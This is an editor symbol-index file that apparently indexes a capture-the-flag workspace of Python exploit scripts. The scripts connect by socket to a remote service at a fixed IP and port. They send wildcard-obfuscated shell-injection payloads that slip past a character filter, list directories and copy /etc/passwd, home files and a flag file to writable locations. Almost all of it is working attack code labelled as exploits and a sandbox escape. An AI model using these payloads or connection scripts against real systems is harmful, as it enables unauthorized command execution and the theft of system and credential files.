        "peekOfCode": "HOST = \"94.237.123.87\"\nPORT = 44123\n# Custom payloads based on initial findings\ncustom_payloads = [\n    # Directory listing attempts using /bin/ls (which we know exists)\n    \"$(/???/ls)\",                    # Try to execute /bin/ls\n    \"$(/???/ls /)\",                  # List root directory\n    \"$(/???/ls /???)\",               # List /bin directory\n    \"$(/???/ls /???/)\",              # List /bin/ directory\n    \"$(/???/ls /????)\",              # List /home directory",
        "detail": "custom_payloads",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "custom_payloads",
        "description": "custom_payloads",
        "peekOfCode": "PORT = 44123\n# Custom payloads based on initial findings\ncustom_payloads = [\n    # Directory listing attempts using /bin/ls (which we know exists)\n    \"$(/???/ls)\",                    # Try to execute /bin/ls\n    \"$(/???/ls /)\",                  # List root directory\n    \"$(/???/ls /???)\",               # List /bin directory\n    \"$(/???/ls /???/)\",              # List /bin/ directory\n    \"$(/???/ls /????)\",              # List /home directory\n    \"$(/???/ls /????/)\",             # List /home/ directory",
        "detail": "custom_payloads",
        "documentation": {}
    },
    {
        "label": "custom_payloads",
        "kind": 5,
        "importPath": "custom_payloads",
        "description": "custom_payloads",
        "peekOfCode": "custom_payloads = [\n    # Directory listing attempts using /bin/ls (which we know exists)\n    \"$(/???/ls)\",                    # Try to execute /bin/ls\n    \"$(/???/ls /)\",                  # List root directory\n    \"$(/???/ls /???)\",               # List /bin directory\n    \"$(/???/ls /???/)\",              # List /bin/ directory\n    \"$(/???/ls /????)\",              # List /home directory\n    \"$(/???/ls /????/)\",             # List /home/ directory\n    \"$(/???/ls /????/????)\",         # List /home/user directory\n    # File reading attempts using /bin/cat",
        "detail": "custom_payloads",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": "exploit_payloads",
        "description": "exploit_payloads",
        "peekOfCode": "def connect_to_service():\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((HOST, PORT))\n        print(f\"[+] Connected to {HOST}:{PORT}\")\n        # Receive initial banner\n        banner = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[+] Banner received:\")",
        "detail": "exploit_payloads",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "exploit_payloads",
        "description": "exploit_payloads",
        "peekOfCode": "def send_payload(sock, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        sock.sendall((payload + '\\n').encode())\n        time.sleep(1)  # Give the server time to respond\n        # Receive response\n        response = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[*] Response:\")\n        print(response)",
        "detail": "exploit_payloads",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "exploit_payloads",
        "description": "exploit_payloads",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the exploit payloads.\"\"\"\n    results = []\n    sock = connect_to_service()\n    if not sock:\n        sys.exit(1)\n    try:\n        for i, payload in enumerate(exploit_payloads):\n            print(f\"\\n[*] Testing payload {i+1}/{len(exploit_payloads)}\")\n            result = send_payload(sock, payload)",
        "detail": "exploit_payloads",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "exploit_payloads",
        "description": "exploit_payloads",
        "peekOfCode": "HOST = \"94.237.123.87\"\nPORT = 44123\n# Exploit payloads based on our discoveries\nexploit_payloads = [\n    # Try to use /bin/cp to copy files\n    \"/???/?? /??? /???/????\",         # Try to copy /bin to /tmp/xxxx\n    \"/???/?? /??? /???/?\",            # Try to copy /bin to /tmp/x\n    \"/???/?? /??? /???\",              # Try to copy /bin to /tmp\n    # Try to use /bin/cp to copy specific files\n    \"/???/?? /???/????? /???/????\",   # Try to copy /etc/passwd to /tmp/xxxx",
        "detail": "exploit_payloads",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "exploit_payloads",
        "description": "exploit_payloads",
        "peekOfCode": "PORT = 44123\n# Exploit payloads based on our discoveries\nexploit_payloads = [\n    # Try to use /bin/cp to copy files\n    \"/???/?? /??? /???/????\",         # Try to copy /bin to /tmp/xxxx\n    \"/???/?? /??? /???/?\",            # Try to copy /bin to /tmp/x\n    \"/???/?? /??? /???\",              # Try to copy /bin to /tmp\n    # Try to use /bin/cp to copy specific files\n    \"/???/?? /???/????? /???/????\",   # Try to copy /etc/passwd to /tmp/xxxx\n    \"/???/?? /????/????? /???/????\",  # Try to copy /home/xxxxx to /tmp/xxxx",
        "detail": "exploit_payloads",
        "documentation": {}
    },
    {
        "label": "exploit_payloads",
        "kind": 5,
        "importPath": "exploit_payloads",
        "description": "exploit_payloads",
        "peekOfCode": "exploit_payloads = [\n    # Try to use /bin/cp to copy files\n    \"/???/?? /??? /???/????\",         # Try to copy /bin to /tmp/xxxx\n    \"/???/?? /??? /???/?\",            # Try to copy /bin to /tmp/x\n    \"/???/?? /??? /???\",              # Try to copy /bin to /tmp\n    # Try to use /bin/cp to copy specific files\n    \"/???/?? /???/????? /???/????\",   # Try to copy /etc/passwd to /tmp/xxxx\n    \"/???/?? /????/????? /???/????\",  # Try to copy /home/xxxxx to /tmp/xxxx\n    \"/???/?? /????/???? /???/????\",   # Try to copy /home/flag to /tmp/xxxx\n    \"/???/?? /???? /???/????\",        # Try to copy /flag to /tmp/xxxx",
        "detail": "exploit_payloads",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": "final_exploit",
        "description": "final_exploit",
        "peekOfCode": "def connect_to_service():\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((HOST, PORT))\n        print(f\"[+] Connected to {HOST}:{PORT}\")\n        # Receive initial banner\n        banner = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[+] Banner received:\")",
        "detail": "final_exploit",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "final_exploit",
        "description": "final_exploit",
        "peekOfCode": "def send_payload(sock, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        sock.sendall((payload + '\\n').encode())\n        time.sleep(1)  # Give the server time to respond\n        # Receive response\n        response = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[*] Response:\")\n        print(response)",
        "detail": "final_exploit",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "final_exploit",
        "description": "final_exploit",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the final exploit payloads.\"\"\"\n    results = []\n    sock = connect_to_service()\n    if not sock:\n        sys.exit(1)\n    try:\n        for i, payload in enumerate(final_payloads):\n            print(f\"\\n[*] Testing payload {i+1}/{len(final_payloads)}\")\n            result = send_payload(sock, payload)",
        "detail": "final_exploit",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "final_exploit",
        "description": "final_exploit",
        "peekOfCode": "HOST = \"94.237.123.87\"\nPORT = 44123\n# Final exploit payloads based on our discoveries\nfinal_payloads = [\n    # Try to use /bin/cp to copy files to a writable location\n    \"/???/?? /???/????? /???/????\",   # Try to copy /etc/passwd to /var/mail\n    \"/???/?? /????/????? /???/????\",  # Try to copy /home/xxxxx to /var/mail\n    \"/???/?? /????/???? /???/????\",   # Try to copy /home/flag to /var/mail\n    \"/???/?? /???? /???/????\",        # Try to copy /flag to /var/mail\n    # Try to use /bin/cp with different paths",
        "detail": "final_exploit",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "final_exploit",
        "description": "final_exploit",
        "peekOfCode": "PORT = 44123\n# Final exploit payloads based on our discoveries\nfinal_payloads = [\n    # Try to use /bin/cp to copy files to a writable location\n    \"/???/?? /???/????? /???/????\",   # Try to copy /etc/passwd to /var/mail\n    \"/???/?? /????/????? /???/????\",  # Try to copy /home/xxxxx to /var/mail\n    \"/???/?? /????/???? /???/????\",   # Try to copy /home/flag to /var/mail\n    \"/???/?? /???? /???/????\",        # Try to copy /flag to /var/mail\n    # Try to use /bin/cp with different paths\n    \"/???/?? /???/????? /???\",        # Try to copy /etc/passwd to /var",
        "detail": "final_exploit",
        "documentation": {}
    },
    {
        "label": "final_payloads",
        "kind": 5,
        "importPath": "final_exploit",
        "description": "final_exploit",
        "peekOfCode": "final_payloads = [\n    # Try to use /bin/cp to copy files to a writable location\n    \"/???/?? /???/????? /???/????\",   # Try to copy /etc/passwd to /var/mail\n    \"/???/?? /????/????? /???/????\",  # Try to copy /home/xxxxx to /var/mail\n    \"/???/?? /????/???? /???/????\",   # Try to copy /home/flag to /var/mail\n    \"/???/?? /???? /???/????\",        # Try to copy /flag to /var/mail\n    # Try to use /bin/cp with different paths\n    \"/???/?? /???/????? /???\",        # Try to copy /etc/passwd to /var\n    \"/???/?? /????/????? /???\",       # Try to copy /home/xxxxx to /var\n    \"/???/?? /????/???? /???\",        # Try to copy /home/flag to /var",
        "detail": "final_exploit",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": "sandbox_escape",
        "description": "sandbox_escape",
        "peekOfCode": "def connect_to_service():\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((HOST, PORT))\n        print(f\"[+] Connected to {HOST}:{PORT}\")\n        # Receive initial banner\n        banner = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[+] Banner received:\")",
        "detail": "sandbox_escape",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "sandbox_escape",
        "description": "sandbox_escape",
        "peekOfCode": "def send_payload(sock, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        sock.sendall((payload + '\\n').encode())\n        time.sleep(1)  # Give the server time to respond\n        # Receive response\n        response = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[*] Response:\")\n        print(response)",
        "detail": "sandbox_escape",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "sandbox_escape",
        "description": "sandbox_escape",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox escape tool.\"\"\"\n    results = []\n    sock = connect_to_service()\n    if not sock:\n        sys.exit(1)\n    try:\n        for i, payload in enumerate(payloads):\n            print(f\"\\n[*] Testing payload {i+1}/{len(payloads)}\")\n            result = send_payload(sock, payload)",
        "detail": "sandbox_escape",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "sandbox_escape",
        "description": "sandbox_escape",
        "peekOfCode": "HOST = \"94.237.123.87\"\nPORT = 44123\n# Payloads designed for the specific character set: ^[0-9${}/?\"[:space:]:&>_=()]+$\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory",
        "detail": "sandbox_escape",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "sandbox_escape",
        "description": "sandbox_escape",
        "peekOfCode": "PORT = 44123\n# Payloads designed for the specific character set: ^[0-9${}/?\"[:space:]:&>_=()]+$\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type",
        "detail": "sandbox_escape",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": "sandbox_escape",
        "description": "sandbox_escape",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user\n    # Directory exploration using wildcards",
        "detail": "sandbox_escape",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "send_payloads",
        "description": "send_payloads",
        "peekOfCode": "def send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:\n        return f\"[ERROR] {e}\"\ndef main():",
        "detail": "send_payloads",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "send_payloads",
        "description": "send_payloads",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"\\n[>>] Payload: {repr(payload)}\")\n        output = send_payload(payload)\n        print(f\"[<<] Response:\\n{output}\\n{'=' * 50}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": "send_payloads",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "send_payloads",
        "description": "send_payloads",
        "peekOfCode": "HOST = '94.237.123.87'\nPORT = 44123\ndef send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:",
        "detail": "send_payloads",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "send_payloads",
        "description": "send_payloads",
        "peekOfCode": "PORT = 44123\ndef send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:\n        return f\"[ERROR] {e}\"",
        "detail": "send_payloads",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": "targeted_payloads",
        "description": "targeted_payloads",
        "peekOfCode": "def connect_to_service():\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((HOST, PORT))\n        print(f\"[+] Connected to {HOST}:{PORT}\")\n        # Receive initial banner\n        banner = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[+] Banner received:\")",
        "detail": "targeted_payloads",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "targeted_payloads",
        "description": "targeted_payloads",
        "peekOfCode": "def send_payload(sock, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        sock.sendall((payload + '\\n').encode())\n        time.sleep(1)  # Give the server time to respond\n        # Receive response\n        response = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[*] Response:\")\n        print(response)",
        "detail": "targeted_payloads",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "targeted_payloads",
        "description": "targeted_payloads",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the targeted payloads.\"\"\"\n    results = []\n    sock = connect_to_service()\n    if not sock:\n        sys.exit(1)\n    try:\n        for i, payload in enumerate(targeted_payloads):\n            print(f\"\\n[*] Testing payload {i+1}/{len(targeted_payloads)}\")\n            result = send_payload(sock, payload)",
        "detail": "targeted_payloads",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "targeted_payloads",
        "description": "targeted_payloads",
        "peekOfCode": "HOST = \"94.237.123.87\"\nPORT = 44123\n# Targeted payloads based on what worked in the initial scan\ntargeted_payloads = [\n    # Exploring with /bin/cp (which worked in the initial scan)\n    \"/???/??\",                       # This matched /bin/cp in the initial scan\n    # Trying different patterns that might match other binaries\n    \"/???/?\",                        # Try to match /bin/a, /bin/b, etc.\n    \"/???/???\",                      # Try to match /bin/abc\n    \"/???/????\",                     # Try to match /bin/abcd",
        "detail": "targeted_payloads",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "targeted_payloads",
        "description": "targeted_payloads",
        "peekOfCode": "PORT = 44123\n# Targeted payloads based on what worked in the initial scan\ntargeted_payloads = [\n    # Exploring with /bin/cp (which worked in the initial scan)\n    \"/???/??\",                       # This matched /bin/cp in the initial scan\n    # Trying different patterns that might match other binaries\n    \"/???/?\",                        # Try to match /bin/a, /bin/b, etc.\n    \"/???/???\",                      # Try to match /bin/abc\n    \"/???/????\",                     # Try to match /bin/abcd\n    # Trying different paths",
        "detail": "targeted_payloads",
        "documentation": {}
    },
    {
        "label": "targeted_payloads",
        "kind": 5,
        "importPath": "targeted_payloads",
        "description": "targeted_payloads",
        "peekOfCode": "targeted_payloads = [\n    # Exploring with /bin/cp (which worked in the initial scan)\n    \"/???/??\",                       # This matched /bin/cp in the initial scan\n    # Trying different patterns that might match other binaries\n    \"/???/?\",                        # Try to match /bin/a, /bin/b, etc.\n    \"/???/???\",                      # Try to match /bin/abc\n    \"/???/????\",                     # Try to match /bin/abcd\n    # Trying different paths\n    \"/??/?\",                         # Try to match /xx/x\n    \"/??/??\",                        # Try to match /xx/xx",
        "detail": "targeted_payloads",
        "documentation": {}
    }
]